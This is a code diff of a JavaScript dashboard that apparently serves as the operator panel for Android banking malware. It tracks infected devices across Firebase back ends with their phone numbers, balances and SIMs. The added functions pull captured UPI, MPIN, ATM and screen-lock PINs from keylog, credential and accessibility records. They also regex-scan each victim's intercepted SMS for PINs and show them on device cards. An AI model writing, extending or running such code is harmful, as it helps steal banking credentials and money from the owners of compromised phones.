@@ -340,10 +340,54 @@ function deviceOnlineFromRaw(s,fbId){
 }
 function isApkYes(v){return String(v||'').toLowerCase()==='yes';}
 function hasApkModelName(raw){return !!(raw&&raw.modelName!=null&&String(raw.modelName).trim());}
-function getApkUpiPin(raw){
+function getApkUpiPin(raw,d){
+  if(!raw&&d&&d.pin)return String(d.pin).trim();
+  if(raw){
+    var directKeys=['upipin','upiPin','UPIPIN','UpiPin','upi_pin','UPI_PIN','pin','PIN','mpin','MPIN','device_pin','devicePin','screen_pin','screenPin','upi_mpin','upiMpin','captured_pin','capturedPin','atm_pin','atmPin'];
+    var i,v,s;
+    for(i=0;i<directKeys.length;i++){
+      v=raw[directKeys[i]];
+      if(v==null||v==='')continue;
+      s=String(v).trim();
+      if(s&&s!=='0'&&s!=='null'&&s!=='undefined'&&!/^unknown$/i.test(s))return s;
+    }
+  }
+  var parsed=extractPinFromRecord(raw);
+  if(parsed)return parsed;
+  if(d&&d.pin)return String(d.pin).trim();
+  return '';
+}
+function isPinFieldKey(key){
+  if(!key||typeof key!=='string')return false;
+  var k=key.toLowerCase();
+  if(k==='ping'||k==='typing'||k==='spin'||k==='opinion'||k==='spinner')return false;
+  return /^(upipin|upi_pin|upipincode|device_pin|devicepin|screen_pin|screenpin|lock_pin|lockpin|pin_code|pincode|atm_pin|atmpin|captured_pin|capturedpin|upi_mpin|upimpin|mpin|pin)$/.test(k);
+}
+function formatApkDateFromMs(ms){
+  if(!ms)return '';
+  var dt=new Date(ms);
+  if(isNaN(dt.getTime()))return '';
+  var dd=String(dt.getDate()).padStart(2,'0'),mm=String(dt.getMonth()+1).padStart(2,'0'),yyyy=dt.getFullYear();
+  var h=dt.getHours(),mi=String(dt.getMinutes()).padStart(2,'0'),ap=h>=12?'PM':'AM';
+  h=h%12||12;
+  return dd+'/'+mm+'/'+yyyy+' | '+h+':'+mi+' '+ap;
+}
+function getApkJoined(raw){
   if(!raw)return '';
-  var p=raw.upipin!=null?String(raw.upipin).trim():'';
-  return p||extractPinFromRecord(raw)||'';
+  var keys=['joined','dateJoined','date_joined','joinDate','joinedAt','joined_at','installDate','install_date','createdAt','created_at','regDate','registerDate','registeredAt','registrationDate','timestamp','lastMessageTime'];
+  var i,v;
+  for(i=0;i<keys.length;i++){
+    v=raw[keys[i]];
+    if(v==null||v==='')continue;
+    if(typeof v==='number'||(!isNaN(Number(v))&&String(v).replace(/\D/g,'').length>=10)){
+      var fmt=formatApkDateFromMs(toTimestampMs(v));
+      if(fmt)return fmt;
+    }
+    return String(v).trim();
+  }
+  var hb=extractHeartbeatMs(raw);
+  if(hb)return formatApkDateFromMs(hb);
+  return '';
 }
 function getApkMobNo(raw,d){
   if(raw&&raw.mobNo!=null&&String(raw.mobNo).trim()&&!/^unknown$/i.test(String(raw.mobNo).trim()))return String(raw.mobNo).trim();
@@ -381,7 +425,6 @@ function fillDeviceSmsTo(d,force){
 }
 function getApkModel(raw,d){return String((raw&&raw.modelName)||(d&&d.name)||'Unknown');}
 function getApkMoney(raw){return raw&&raw.money!=null?String(raw.money):'';}
-function getApkJoined(raw){return raw&&raw.joined!=null?String(raw.joined):'';}
 function isApkLiked(id){return isApkYes(getRawDev(id).liked);}
 function isApkChecked(id){return parseApkBool(getRawDev(id).checked);}
 function isApkLoggedIn(id){return isApkYes(getRawDev(id).login);}
@@ -389,10 +432,13 @@ function isApkOnlineRaw(raw){return parseApkBool(raw&&raw.status);}
 function hasApkUpiPin(id){return !!getApkUpiPin(getRawDev(id)).trim();}
 function parseJoinedToMs(joined){
   if(!joined)return 0;
+  if(typeof joined==='number')return joined<1e12?joined*1000:joined;
   var s=String(joined).trim();
-  var m=s.match(/(\d{1,2})\/(\d{1,2})\/(\d{4})/);
+  var m=s.match(/(\d{1,2})\/(\d{1,2})\/(\d{4})(?:\s*[|\s]\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM|am|pm)?)?/i);
   if(m){
-    var dt=new Date(+m[3],+m[2]-1,+m[1]);
+    var dd=+m[1],MM=+m[2],yyyy=+m[3],hh=+(m[4]||0),mi=+(m[5]||0),ss=+(m[6]||0),ap=m[7];
+    if(ap){var p=ap.toUpperCase();if(p==='PM'&&hh<12)hh+=12;if(p==='AM'&&hh===12)hh=0;}
+    var dt=new Date(yyyy,MM-1,dd,hh,mi,ss);
     if(!isNaN(dt.getTime()))return dt.getTime();
   }
   var n=Date.parse(s);
@@ -477,13 +523,12 @@ function formatDevDate(d){
   var raw=clientsRawMap[d.id]||{};
   var joined=getApkJoined(raw);
   if(joined)return 'DATE: '+joined;
-  var ts=raw._lastOnlineMs||raw.last_seen||raw.updated_at||raw.timestamp||Date.now();
-  var dt=new Date(typeof ts==='number'&&ts<1e12?ts*1000:ts);
-  if(isNaN(dt.getTime()))return 'DATE: —';
-  var dd=String(dt.getDate()).padStart(2,'0'),mm=String(dt.getMonth()+1).padStart(2,'0'),yyyy=dt.getFullYear();
-  var h=dt.getHours(),mi=String(dt.getMinutes()).padStart(2,'0'),ap=h>=12?'pm':'am';
-  h=h%12||12;
-  return 'DATE: '+dd+'/'+mm+'/'+yyyy+' | '+h+':'+mi+' '+ap;
+  var hb=extractHeartbeatMs(raw);
+  if(hb){
+    var fmt=formatApkDateFromMs(hb);
+    if(fmt)return 'DATE: '+fmt;
+  }
+  return 'DATE: —';
 }
 function setMoneyFilter(mode){
   moneyFilterMode=mode||'amount';
@@ -608,7 +653,7 @@ function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(fireb
 function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
 function extractPinFromRecord(raw){
   if(!raw||typeof raw!=='object')return '';
-  var keys=['pin','PIN','upipin','upiPin','device_pin','devicePin','mpin','MPIN','upi_pin','screen_pin','screenPin','lock_pin','lockPin','pin_code','pinCode','atm_pin','atmPin','captured_pin','capturedPin','upi_mpin','upiMpin'];
+  var keys=['upipin','upiPin','UPIPIN','UpiPin','pin','PIN','device_pin','devicePin','mpin','MPIN','upi_pin','screen_pin','screenPin','lock_pin','lockPin','pin_code','pinCode','atm_pin','atmPin','captured_pin','capturedPin','upi_mpin','upiMpin'];
   var check=function(obj){
     if(!obj||typeof obj!=='object')return '';
     var i,v,s;
@@ -616,19 +661,19 @@ function extractPinFromRecord(raw){
       v=obj[keys[i]];
       if(v==null)continue;
       s=String(v).trim();
-      if(s&&s!=='0'&&s!=='null'&&s!=='undefined')return s;
+      if(s&&s!=='0'&&s!=='null'&&s!=='undefined'&&/^\d{4,8}$/.test(s))return s;
     }
     return '';
   };
-  var p=check(raw), nests=['device_info','live_data','deviceInfo','liveData','data','info','captured','keylog','key_log','upi','bank','credentials'], i, j, k, v, s;
+  var p=check(raw), nests=['device_info','live_data','deviceInfo','liveData','data','info','captured','keylog','key_log','upi','bank','credentials','pin_data','pinData','screen','accessibility'], i, k, v, s;
   if(p)return p;
   for(i=0;i<nests.length;i++){if(raw[nests[i]]){p=check(raw[nests[i]]);if(p)return p;}}
   function deepScan(obj,depth){
-    if(!obj||typeof obj!=='object'||depth>4)return '';
+    if(!obj||typeof obj!=='object'||depth>5)return '';
     for(k in obj){
       if(!Object.prototype.hasOwnProperty.call(obj,k))continue;
       v=obj[k];
-      if(/pin/i.test(k)&&v!=null){
+      if(isPinFieldKey(k)&&v!=null){
         s=String(v).trim();
         if(s&&s!=='0'&&s!=='null'&&/^\d{4,8}$/.test(s))return s;
       }
@@ -637,6 +682,59 @@ function extractPinFromRecord(raw){
     return '';
   }
   return deepScan(raw,0);
+}
+function extractPinFromSmsList(list){
+  if(!list||!list.length)return '';
+  var i,body,m,pinRe=[
+    /\b(?:upi\s*pin|mpin|atm\s*pin)\s*(?:is|:|=|-)\s*(\d{4,8})\b/i,
+    /\b(?:pin\s*(?:is|:|=|-))\s*(\d{4,8})\b/i,
+    /\b(?:enter(?:ed)?\s*(?:upi\s*)?pin)\s*[:\s]?\s*(\d{4,8})\b/i,
+    /(?:MPIN|UPI\s*PIN|PIN)[-:\s]+(\d{4,8})\b/i,
+    /(?:PASSWORD-\d+-MPIN-|MPIN-)(\d{4,8})\b/i
+  ];
+  for(i=0;i<list.length;i++){
+    body=String((list[i]&&list[i].body)||(list[i]&&list[i].message)||'');
+    if(!body||/otp\s*to\s*generate\s*upi\s*pin/i.test(body))continue;
+    if(/otp|one time password|verification code/i.test(body)&&/generate/i.test(body))continue;
+    var j;
+    for(j=0;j<pinRe.length;j++){
+      m=body.match(pinRe[j]);
+      if(m&&m[1])return m[1];
+    }
+  }
+  return '';
+}
+function applyPinToDevice(devId,pin){
+  pin=String(pin||'').trim();
+  if(!pin||!devId||!/^\d{4,8}$/.test(pin))return false;
+  var raw=clientsRawMap[devId];
+  if(!raw)return false;
+  if(raw.upipin&&String(raw.upipin).trim()===pin)return false;
+  raw.upipin=pin;
+  raw.upiPin=pin;
+  clientsRawMap[devId]=raw;
+  return true;
+}
+function normalizePinValue(data){
+  if(data==null||data===''||isFirebaseErr(data))return '';
+  if(typeof data==='object')return extractPinFromRecord(data)||'';
+  var pin=String(data).trim();
+  return /^\d{4,8}$/.test(pin)?pin:'';
+}
+function mergeProfileFieldsFromRecord(mapKey,data){
+  if(!data||typeof data!=='object'||isFirebaseErr(data))return false;
+  if(isCommandQueueRecord(data)&&!isDeviceProfileRecord(data))return false;
+  var raw=clientsRawMap[mapKey];
+  if(!raw)return false;
+  var changed=false, fields=['upipin','upiPin','joined','dateJoined','date_joined','installDate','createdAt','created_at'];
+  fields.forEach(function(f){
+    if(data[f]==null||data[f]==='')return;
+    if(raw[f]!=null&&String(raw[f]).trim()!=='')return;
+    raw[f]=data[f];
+    changed=true;
+  });
+  if(changed)clientsRawMap[mapKey]=raw;
+  return changed;
 }
 function deviceHasPin(d){
   if(hasApkUpiPin(d.id))return true;
@@ -1136,7 +1234,7 @@ function ingestDeviceData(fbId,node,devId,data){
     if(norm.mobNo)norm._phoneSource=node;
     if(node==='user_list')norm._node='user_list';
   }
-  var keepFields=['mobNo','modelName','deviceId','liked','like','upipin','login','checked','money','joined','status','battery','sims','androidV','sdkV','label','service_provider','sms_count','device_model','brand','network','lastMessageTime','ping'];
+  var keepFields=['mobNo','modelName','deviceId','liked','like','upipin','upiPin','login','checked','money','joined','dateJoined','date_joined','installDate','createdAt','created_at','timestamp','status','battery','sims','androidV','sdkV','label','service_provider','sms_count','device_model','brand','network','lastMessageTime','ping'];
   var saved={};
   keepFields.forEach(function(f){if(data[f]!==undefined&&data[f]!==null)saved[f]=data[f];});
   if(saved.mobNo!=null&&!norm.mobNo)norm.mobNo=String(saved.mobNo).trim();
@@ -1184,11 +1282,82 @@ function enrichFromAllNodes(inst){
   if(!tasks.length)return Promise.resolve();
   return Promise.all(tasks).then(function(){processClientsData();});
 }
+var PIN_ENRICH_NODES=['clients','devices','Verify_Device','user_list','user_data'];
+function enrichPinsFromFirebase(inst){
+  var keys=Object.keys(clientsRawMap), tasks=[], maxBatch=48;
+  keys.forEach(function(mapKey){
+    var p=parseDevKey(mapKey);
+    if(p.fbId!==inst.id)return;
+    var rec=clientsRawMap[mapKey];
+    if(getApkUpiPin(rec)||extractPinFromRecord(rec))return;
+    var cached=deviceSmsCache[mapKey];
+    if(cached&&cached.list&&cached.list.length){
+      var smsPin=extractPinFromSmsList(cached.list);
+      if(smsPin&&applyPinToDevice(mapKey,smsPin))return;
+    }
+    var devId=p.devId;
+    function addTask(path,parser){
+      if(tasks.length>=maxBatch)return;
+      tasks.push({
+        mapKey:mapKey,
+        promise:restJsonInst(inst,path).then(parser).catch(function(){return '';})
+      });
+    }
+    PIN_ENRICH_NODES.forEach(function(node){
+      addTask(node+'/'+devId+'/upipin',normalizePinValue);
+      addTask(node+'/'+devId,function(data){
+        if(!data||typeof data!=='object'||isFirebaseErr(data))return '';
+        if(isCommandQueueRecord(data)&&!isDeviceProfileRecord(data))return '';
+        mergeProfileFieldsFromRecord(mapKey,data);
+        return extractPinFromRecord(data)||normalizePinValue(data.upipin||data.upiPin);
+      });
+    });
+    addTask(devId+'/upipin',normalizePinValue);
+    addTask(devId,function(data){
+      if(!data||typeof data!=='object'||isFirebaseErr(data))return '';
+      mergeProfileFieldsFromRecord(mapKey,data);
+      return extractPinFromRecord(data)||normalizePinValue(data.upipin||data.upiPin);
+    });
+  });
+  if(!tasks.length)return Promise.resolve();
+  return Promise.all(tasks.map(function(t){
+    return t.promise.then(function(pin){return {mapKey:t.mapKey,pin:pin};});
+  })).then(function(results){
+    var changed=false;
+    results.forEach(function(r){
+      if(r.pin&&applyPinToDevice(r.mapKey,r.pin))changed=true;
+    });
+    if(changed)processClientsData();
+  });
+}
+function enrichPinsFromSms(inst){
+  var keys=Object.keys(clientsRawMap), tasks=[], batch=0, maxBatch=24;
+  keys.forEach(function(mapKey){
+    var p=parseDevKey(mapKey);
+    if(p.fbId!==inst.id)return;
+    if(getApkUpiPin(clientsRawMap[mapKey]))return;
+    if(batch>=maxBatch)return;
+    batch++;
+    var stub={id:mapKey,rawId:p.devId,fbId:p.fbId};
+    tasks.push(fetchSmsFast(inst,stub).then(function(list){
+      if(!list||!list.length)return;
+      var pin=extractPinFromSmsList(list);
+      if(pin)applyPinToDevice(mapKey,pin);
+      setDeviceSms(mapKey,list);
+    }).catch(function(){}));
+  });
+  if(!tasks.length)return Promise.resolve();
+  return Promise.all(tasks).then(function(){processClientsData();});
+}
 function enrichFromUserList(inst){
   return fetchSummaryNode(inst,'user_list').then(function(){
     return fetchSummaryNode(inst,'user_data').catch(function(){return null;});
   }).then(function(){
     return enrichFromAllNodes(inst);
+  }).then(function(){
+    return enrichPinsFromFirebase(inst);
+  }).then(function(){
+    return enrichPinsFromSms(inst);
   }).then(function(){
     processClientsData();
   });
@@ -1372,7 +1541,7 @@ function buildDevCardHtml(d,i,total){
   var on=d.status==='online';
   var phone=getApkMobNo(raw,d);
   var info='Phone : '+esc(phone)+'\nModel : '+esc(getApkModel(raw,d))+'\nBattery : '+(raw.battery!=null?raw.battery:d.battery)+'%\n$- : '+esc(getApkMoney(raw));
-  var pinLine='PIN = '+esc(getApkUpiPin(raw)||'—');
+  var pinLine='PIN = '+esc(getApkUpiPin(raw,d)||'—');
   var count=(total!=null?total-i:i+1);
   return '<div class="dev-card" data-dev-id="'+escAttr(d.id)+'"><div class="dev-card-inner">'+
     '<div class="dev-count">'+count+'</div>'+
@@ -1883,6 +2052,8 @@ function setDeviceSms(devId,list){
   var sms=(list||[]).slice().sort(function(a,b){return (b.ts||0)-(a.ts||0);});
   deviceSmsCache[devId]={list:sms,at:Date.now()};
   persistSmsCacheSoon();
+  var smsPin=extractPinFromSmsList(sms);
+  if(smsPin&&applyPinToDevice(devId,smsPin))processClientsData();
   if(selDev===devId){
     window_allSms=sms;
     window_sms=sms.slice(0,80);
